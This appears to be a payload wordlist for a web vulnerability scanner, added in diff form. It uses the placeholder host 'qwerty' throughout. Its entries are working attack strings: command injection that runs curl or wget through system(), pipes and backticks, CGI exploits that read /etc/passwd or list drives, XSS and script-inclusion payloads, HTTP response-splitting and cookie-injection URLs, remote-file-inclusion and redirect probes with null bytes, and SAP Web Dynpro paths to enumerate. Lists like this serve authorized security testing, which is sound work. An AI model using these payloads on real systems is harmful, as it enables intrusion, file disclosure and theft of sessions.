+cgi-bin/FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40qwerty&redirect=http%3A%2F%2Fqwerty&recipient=sq%40qwerty
+cgi-bin/WINDMAIL.EXE?%20-n%20c:\boot.ini%20Hacker@hax0r.com%20|%20dir%20c:\
+cgi-bin/shopplus.cgi?dn=domainname.com&cartid=%CARTID%&file=;cat%20/etc/passwd|
+cgi-bin/webbbs/webbbs_config.pl?name=joe&email=test@qwerty&body=aaaaffff&followup=10;cat%20/etc/passwd
+qwerty
+curl https://qwerty/.testing/rce_vuln.txt
+curl https://qwerty/.testing/rce_vuln.txt ||`curl https://qwerty/.testing/rce_vuln.txt` #' |curl https://qwerty/.testing/rce_vuln.txt||`curl https://qwerty/.testing/rce_vuln.txt` #\" |curl https://qwerty/.testing/rce_vuln.txt
+echo '<img src=https://qwerty/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+echo '<script src=https://qwerty/.testing/xss.js></script>'// XXXXXXXXXXX
+en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLocation%3A%20http%3A%2F%2Fqwerty%0aContent-Length%3A%20122%0a%3Chtml%3E%3CBODY%20ONLOAD%3Dalert('XSS')%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3CIFRAME%20SRC%3D%22javascript%3Aalert('XSS')%3B%22%3E%3C%2FIFRAME%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+http://www.<script>alert(1)</script .com
+http://www.qwerty
+http://www.qwerty/.testing/iframe_injection.php
+http://www.qwerty/.testing/redirect_vuln.txt
+http://www.qwerty/.testing/redirect_vuln.txt%00
+http://www.qwerty/.testing/rfi_vuln.php
+http://www.qwerty/.testing/rfi_vuln.php%00
+http://www.qwerty/.testing/rfi_vuln.txt
+http://www.qwerty/.testing/rfi_vuln.txt%00
+http://www.qwerty/.testing/xss.html
+http://www.qwerty/.testing/xss.html%00
+http://www.qwerty/.testing/xss_vuln.html
+http://www.qwerty/.testing/xss_vuln.html%00
+http://www.qwerty/.testing/xss_vuln.php
+http://www.qwerty/.testing/xss_vuln.php%00
+http://www.google<script .com>alert(document.location)</script
+http://qwerty
+http://qwerty/.testing/iframe_injection.php
+http://qwerty/.testing/redirect_vuln.txt
+http://qwerty/.testing/redirect_vuln.txt%00
+http://qwerty/.testing/rfi_vuln.php
+http://qwerty/.testing/rfi_vuln.php%00
+http://qwerty/.testing/rfi_vuln.txt
+http://qwerty/.testing/rfi_vuln.txt%00
+http://qwerty/.testing/xss.html
+http://qwerty/.testing/xss.html%00
+http://qwerty/.testing/xss_vuln.html
+http://qwerty/.testing/xss_vuln.html%00
+http://qwerty/.testing/xss_vuln.php
+http://qwerty/.testing/xss_vuln.php%00
+http://xss.qwerty
+http://xss.qwerty/.testing/rfi_vuln.txt
+http://xss.qwerty/.testing/rfi_vuln.txt%00
+https://qwerty
+https://qwerty/%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Set-Coookie%3Aqwerty%3Dqwerty
+https://qwerty/%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Set-Coookie%3Aqwerty%3Dqwerty
+https://qwerty/.testing/rfi_vuln.php
+https://qwerty/.testing/rfi_vuln.php%00
+https://qwerty/.testing/rfi_vuln.txt
+https://qwerty/.testing/rfi_vuln.txt%00
+https://www.qwerty/
+https://www.qwerty/
+javascript:alert(1)//qwerty
+javascript:alert(1)//qwerty
+javascript:document.location=http://www.qwerty
+javascript:document.location=http://qwerty
+javascript:document.location=http://xss.qwerty
+mail/addressaction.html?id=<USERID#>&newaddress=1&addressname=<script>alert('Vulnerable')</script>&addressemail=junk@qwerty
+pforum/edituser.php?boardid=&agree=1&username=%3Cscript%3Ealert('Vulnerable')%3C/script%3E&nickname=test&email=test@qwerty&pwd=test&pwd2=test&filled=1
+phpping/index.php?pingto=www.test.com%20|%20dir%20c:\
+src="http://qwerty/XSS.js"></script>
+system('curl https://qwerty/.testing/rce_vuln.txt')
+system('curl https://qwerty/.testing/rce_vuln.txt?req=22fd2wdf')
+system('curl https://qwerty/.testing/rce_vuln.txt');
+system('wget https://qwerty/.testing/rce_vuln.txt?req=22fd2w23')
+system('wget https://qwerty/.testing/rce_vuln.txt');
+user.php?op=confirmnewuser&module=NS-NewUser&uname=%22%3E%3Cimg%20src=%22javascript:alert(document.cookie);%22%3E&email=test@test.com
+webdynpro/dispatcher/qwerty/grc~accvwdcomp
+webdynpro/dispatcher/qwerty/grc~aewebquery
+webdynpro/dispatcher/qwerty/grc~ccappcomp
+webdynpro/dispatcher/qwerty/grc~ccxsysbe
+webdynpro/dispatcher/qwerty/grc~ccxsysbehr
+webdynpro/dispatcher/qwerty/grc~ffappcomp
+webdynpro/dispatcher/qwerty/pb/pagebuilder
+webdynpro/dispatcher/qwerty/tc~kmc~bc.uwl.ui~wd_ui
+webdynpro/dispatcher/qwerty/tc~kmc~bc.uwl.ui~wd_ui/uwl
+webdynpro/dispatcher/qwerty/tc~kmc~bc.uwl.ui~wd_ui/uwldetail
+webdynpro/dispatcher/qwerty/tc~kmc~bc.uwl.ui~wd_ui/uwldisplayhistory
+webdynpro/dispatcher/qwerty/tc~lm~webadmin~mainframe~wd/WebAdminApp
+webdynpro/dispatcher/qwerty/tc~sec~ume~wd~enduser/UmeEnduserApp
+webdynpro/dispatcher/qwerty/tc~wd~dispwda/servlet_jsp/webdynpro/welcome/root/Welcome.jsp
+webdynpro/dispatcher/qwerty/tc~wd~tools
+webdynpro/dispatcher/qwerty/tc~wd~tools/Explorer
+webdynpro/dispatcher/qwerty/tc~wd~tools/WebDynproConsole
+webdynpro/dispatcher/qwerty/tc~wd~tools/WebDynproConsole 
+webdynpro/dispatcher/qwerty/tc~wd~tools/explorer
+webdynpro/resources/qwerty/
+wget https://qwerty/.testing/rce_vuln.txt
+www.qwerty
+www.qwerty/
+www.qwerty/
+qwerty
+xss.qwerty
+| curl http://qwerty/.testing/rce.txt
+| curl http://xss.qwerty/.testing/rce.txt
+| system('curl https://qwerty/.testing/rce_vuln.txt');
+| wget http://qwerty/.testing/rce.txt
+|/www.qwerty
+|/qwerty
+|| system('curl https://qwerty/.testing/rce_vuln.txt');
+}alert(/qwerty/);{//
